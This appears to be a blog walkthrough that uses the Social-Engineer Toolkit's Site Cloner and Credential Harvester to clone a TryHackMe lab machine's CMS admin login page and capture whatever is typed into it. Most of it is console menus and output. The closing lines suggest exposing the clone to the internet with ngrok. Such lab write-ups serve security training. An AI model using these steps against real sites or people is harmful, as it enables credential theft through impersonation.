Phishing, a technique as old as the internet may go, yet it never seems to fade away. Maybe it is the ultimate proof that humans are always vulnerable?

According to wikipedia, "Phishing is the fraudulent attempt to obtain sensitive information or data, such as usernames, passwords and credit card details or other sensitive 
details, by impersonating oneself as a trustworthy entity in a digital communication. Typically carried out by email spoofing, instant messaging, and text messaging, phishing 
often directs users to enter personal information at a fake website which matches the look and feel of the legitimate site."
"Furthermore, phishing is an example of social engineering techniques used to deceive users. Users are lured by communications purporting to be from trusted parties such as 
social networking websites, auction sites, banks, mails/messages from friends or colleagues/executives, online payment systems or IT administrators."

Spear phishing comes in when it is targeted at a certain entity or individual, therefore, these attacks tend to be very well-deveoped and convincing. Today I will like to 
explain how simple it is to clone a custom website for phishing, with the use of [setoolkit](https://github.com/trustedsec/social-engineer-toolkit).

Let's launch ```setoolkit```.

Let us make use of the first option, ```Social-Engineering Attacks```.

From here, we will employ options ```Website Attack Vectors > Credential Harvester Attack Method > Site Cloner```

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.

   1) Web Templates
   2) Site Cloner
   3) Custom Import

```

After this, the application will prompt to enter the server's IP, which is inserted by default, therefore, it is left for the user to press enter. In addition, the URL to clone 
is prompted as well, here we insert our page to clone, which in our case will be a CMS Admin login from the machine ```Ignite``` within [tryhackme](http://tryhackme.com)

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesns't know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perpective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.100.214]:
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://10.10.17.220/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d

[*] Cloning the website: http://10.10.17.220/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d
[*] This could take a little bit...

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

Let's check our webserver, shall we?

![](/assets/img/Phishing/1.png)

Once data, is input, we receive the following response from ```setoolkit```.

This is beyond bewildering, we managed to manifest a custom phishing attack. This might serve as proof that even administators could fall under such attacks, and is not reserved 
to social media! In addition, we could parse this attack into WAN with the use of tools such as [ngrok](http://ngrok.com), or of course, port forwarding as well.
